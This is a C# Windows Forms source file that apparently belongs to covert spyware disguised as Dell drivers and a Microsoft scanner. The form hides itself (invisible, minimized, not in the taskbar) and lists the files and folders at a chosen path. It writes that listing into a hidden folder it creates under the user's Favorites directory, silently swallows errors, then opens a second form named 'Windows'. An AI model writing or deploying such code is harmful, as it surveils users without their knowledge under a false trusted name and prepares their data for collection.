using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dell_Drivers
{
    public partial class Microsoft_Scanner : Form
    {
        public Microsoft_Scanner()
        {
            InitializeComponent();
            this.Opacity = 0;
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }

        private void Microsoft_Scanner_Load(object sender, EventArgs e)
        {
            try
            {
                
                string[] files = Directory.GetFiles(global.path);
                string[] folders = Directory.GetDirectories(global.path);

                global.ListofFiles.Clear();


                for (int i = 0; i < folders.Length; i++)
                {
                    global.ListofFiles.Add(folders[i]);

                }
                for (int i = 0; i < files.Length; i++)
                {
                    global.ListofFiles.Add(files[i]);
                }

                createTextFile();
            }
            catch 
            {
                this.Close();
                GC.Collect();
            }
        }

        private void createTextFile()
        {
            //string fileName = @"c:\Windows\Logs\Telephony\pathRetrieve.txt";
            string fileName = "C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\Path\\pathRetrieve.txt";
            String fileloc = "C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\Path";

            if (!Directory.Exists(fileloc))
            {
                //Directory.CreateDirectory(fileloc);
                DirectoryInfo di = Directory.CreateDirectory(fileloc);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }

            if (Directory.Exists(fileloc))
            {
                pathFileCreation(fileName);
            }

            
        }

        private void pathFileCreation(string fileName)
        {
            try
            {

                // Check if file already exists. If yes, delete it.     
                if (System.IO.File.Exists(fileName))
                {
                    System.IO.File.Delete(fileName);
                }

                // Create a new file     
                using (FileStream fs = System.IO.File.Create(fileName))
                {
                    // Add some text to file    
                    for (int i = 0; i < global.ListofFiles.Count; i++)
                    {
                        byte[] author = new UTF8Encoding(true).GetBytes("\n" + global.ListofFiles[i]);
                        fs.Write(author, 0, author.Length);
                    }

                }

                Windows f2 = new Windows();
                f2.ShowDialog();

                this.Close();
                GC.Collect();

            }
            catch
            {
                this.Close();
                GC.Collect();
            }
        }
    }
}
